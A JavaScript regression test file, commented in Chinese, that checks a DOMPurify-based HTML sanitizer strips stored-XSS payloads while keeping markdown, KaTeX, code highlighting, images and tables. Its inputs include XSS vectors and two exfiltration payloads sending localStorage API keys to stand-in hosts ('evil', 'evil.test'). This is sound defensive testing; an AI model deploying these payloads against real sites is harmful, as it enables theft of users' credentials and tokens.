// HTML 净化层安全测试（P0 回归：存储型 XSS）
//
// 背景：项目有 3 处 v-html（MarkdownRenderer / Excel 预览 / Word 预览），
// 内容可来自 apkg 导入、PDF/Word/Excel 解析、OCR、AI 返回。
// marked@4 已移除内置 sanitize，未净化即渲染 = 存储型 XSS，
// 可窃取 localStorage 中的 AI API Key 与 GitHub Token。
//
// 本文件在 Node 下用 jsdom 注入 window，验证 DOMPurify 真实生效。
import test from 'node:test';
import assert from 'node:assert/strict';
import { JSDOM } from 'jsdom';
import { marked } from 'marked';

import {
  sanitizeHtml,
  setSanitizerWindow,
  isSanitizerReady,
} from '../src/utils/sanitize.js';

// Node 环境没有 window，先注入 jsdom
const win = new JSDOM('').window;
setSanitizerWindow(win);

const has = (s, re) => re.test(s);

test('净化器在注入 window 后可用', () => {
  assert.equal(isSanitizerReady(), true);
});

// ---------- 攻击载荷必须被清除 ----------

test('P0: <script> 标签被移除', () => {
  const out = sanitizeHtml('<p>hi</p><script>alert(1)</script>');
  assert.ok(!has(out, /<script/i), `不应残留 script: ${out}`);
  assert.ok(!has(out, /alert\(1\)/i), `不应残留脚本体: ${out}`);
  assert.ok(out.includes('hi'), '正常文本应保留');
});

test('P0: 事件处理器属性（onerror/onload/onclick）被移除', () => {
  const out = sanitizeHtml('<img src=x onerror="alert(1)">');
  assert.ok(!has(out, /onerror/i), `onerror 必须清除: ${out}`);
  const out2 = sanitizeHtml('<p onclick="steal()">x</p>');
  assert.ok(!has(out2, /onclick/i), `onclick 必须清除: ${out2}`);
  const out3 = sanitizeHtml('<body onload=alert(1)>t</body>');
  assert.ok(!has(out3, /onload/i), `onload 必须清除: ${out3}`);
});

test('P0: javascript: 协议链接被清除', () => {
  const out = sanitizeHtml('<a href="javascript:alert(1)">点我</a>');
  assert.ok(!has(out, /javascript:/i), `javascript: 必须清除: ${out}`);
  assert.ok(out.includes('点我'), '链接文字应保留');
});

test('P0: iframe / object / embed / form 被移除', () => {
  for (const tag of ['iframe', 'object', 'embed', 'form']) {
    const out = sanitizeHtml(`<${tag} src="//evil.com"></${tag}>`);
    assert.ok(!has(out, new RegExp(`<${tag}`, 'i')), `<${tag}> 必须清除: ${out}`);
  }
});

test('P0: SVG 向量 XSS（<svg onload> / <svg><script>）被清除', () => {
  const out = sanitizeHtml('<svg onload="alert(1)"><circle r="1"/></svg>');
  assert.ok(!has(out, /onload/i), `svg onload 必须清除: ${out}`);
  const out2 = sanitizeHtml('<svg><script>alert(1)</script></svg>');
  assert.ok(!has(out2, /<script/i), `svg 内 script 必须清除: ${out2}`);
});

test('P0: 大小写混淆与空字符绕过被拦截', () => {
  const out = sanitizeHtml('<ScRiPt>alert(1)</sCrIpT>');
  assert.ok(!has(out, /<script/i), `大小写混淆必须拦截: ${out}`);
  const out2 = sanitizeHtml('<img src="x" onerror\t=\t"alert(1)">');
  assert.ok(!has(out2, /onerror/i), `空白变体必须拦截: ${out2}`);
});

test('P0: markdown 内嵌原始 HTML 的攻击载荷被清除', () => {
  marked.setOptions({ breaks: true, gfm: true });
  const raw = '# 标题\n\n正常段落\n\n<img src=x onerror="alert(document.domain)">\n\n<script>fetch("//evil?k="+localStorage.getItem("sxy_ai_config"))</script>';
  const out = sanitizeHtml(marked.parse(raw));
  assert.ok(!has(out, /onerror/i), `markdown 内联 onerror 必须清除: ${out}`);
  assert.ok(!has(out, /<script/i), `markdown 内联 script 必须清除: ${out}`);
  assert.ok(!has(out, /localStorage/i), `窃取脚本必须清除: ${out}`);
  assert.ok(out.includes('正常段落'), '正常内容应保留');
  assert.ok(has(out, /<h1/i), 'markdown 标题应保留');
});

test('P0: 窃取 localStorage 凭据的完整攻击链被打断', () => {
  // 模拟 apkg/资料文件注入：读取 AI Key 并外发
  const payload = `<img src="x" onerror="fetch('https://evil.test/'+btoa(localStorage.getItem('sxy_ai_config')))">`;
  const out = sanitizeHtml(payload);
  assert.ok(!has(out, /localStorage/i), `localStorage 引用必须清除: ${out}`);
  assert.ok(!has(out, /evil\.test/i), `外发地址必须清除: ${out}`);
  assert.ok(!has(out, /onerror/i), `事件处理器必须清除: ${out}`);
});

// ---------- 正常内容必须被保留（防止过度净化导致功能退化） ----------

test('正常 markdown 结构保留', () => {
  const out = sanitizeHtml(marked.parse('**粗体** *斜体* `代码` [链接](https://example.com)'));
  assert.ok(has(out, /<strong>/i), `粗体应保留: ${out}`);
  assert.ok(has(out, /<em>/i), `斜体应保留: ${out}`);
  assert.ok(has(out, /<code>/i), `行内代码应保留: ${out}`);
  assert.ok(out.includes('https://example.com'), 'https 链接应保留');
});

test('KaTeX 公式（MathML + style + class）被保留', () => {
  // 取自 katex.renderToString 的真实结构（简化）
  const katex = '<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>x</mi><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">x^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base" style="height:0.8141em;"><span class="strut" style="height:1.0083em;"></span><span class="mord mathnormal">x</span></span></span></span>';
  const out = sanitizeHtml(katex);
  assert.ok(out.includes('katex'), 'katex 类名必须保留');
  assert.ok(has(out, /<math/i), 'MathML math 标签必须保留');
  assert.ok(has(out, /<semantics/i), 'semantics 必须保留（承载 LaTeX 原文，影响无障碍）');
  assert.ok(has(out, /style=/i), 'KaTeX 定位用 style 必须保留');
  assert.ok(out.includes('x^2'), 'LaTeX 原文 annotation 应保留');
});

test('highlight.js 代码块（class="hljs"）被保留', () => {
  const code = '<pre><code class="hljs language-js"><span class="hljs-keyword">const</span> a = <span class="hljs-number">1</span>;</code></pre>';
  const out = sanitizeHtml(code);
  assert.ok(out.includes('hljs'), 'hljs 类名必须保留');
  assert.ok(out.includes('hljs-keyword'), 'token 类名必须保留');
  // 注意用 \b 而非字面 `<code>`：实际输出是 `<code class="...">`
  assert.ok(has(out, /<pre\b/i) && has(out, /<code\b/i), `pre/code 结构必须保留: ${out}`);
});

test('本地 blob: 图片不被误杀（本项目图片走 blob URL）', () => {
  const img = '<img src="blob:http://localhost:5173/uuid-1234" alt="图" class="md-img">';
  const out = sanitizeHtml(img);
  assert.ok(out.includes('blob:'), `blob: 图片必须保留（否则本地图片全挂）: ${out}`);
  assert.ok(out.includes('md-img'), '图片类名应保留');
});

test('data:image 与相对路径图片保留', () => {
  assert.ok(sanitizeHtml('<img src="data:image/png;base64,iVBORw0KGgo=" alt="a">').includes('data:image/png;base64'));
  assert.ok(sanitizeHtml('<img src="/sxybrick/icon.png">').includes('/sxybrick/icon.png'));
});

test('外链自动补 rel=noopener noreferrer', () => {
  const out = sanitizeHtml('<a href="https://example.com" target="_blank">x</a>');
  assert.ok(has(out, /rel="noopener noreferrer"/i), `应自动补 rel: ${out}`);
});

test('表格结构保留（Excel 预览依赖）', () => {
  const tbl = '<h4>Sheet1</h4><table><tbody><tr><td>A</td><td>B</td></tr></tbody></table>';
  const out = sanitizeHtml(tbl);
  assert.ok(has(out, /<table>/i) && has(out, /<td>/i), `表格必须保留: ${out}`);
  assert.ok(out.includes('Sheet1'), '工作表名应保留');
});

// ---------- 边界与降级 ----------

test('空白与非字符串输入返回空串', () => {
  assert.equal(sanitizeHtml(''), '');
  assert.equal(sanitizeHtml(null), '');
  assert.equal(sanitizeHtml(undefined), '');
});

test('无 window 时退化为整体转义（绝不返回原始 HTML）', () => {
  setSanitizerWindow(null);
  try {
    assert.equal(isSanitizerReady(), false);
    const out = sanitizeHtml('<img src=x onerror=alert(1)>');
    assert.ok(!has(out, /<img/i), `无 DOM 时必须转义而非放行: ${out}`);
    assert.ok(out.includes('&lt;img'), '应以实体形式呈现');
  } finally {
    setSanitizerWindow(win); // 复原，避免影响其他用例
  }
  assert.equal(isSanitizerReady(), true);
});
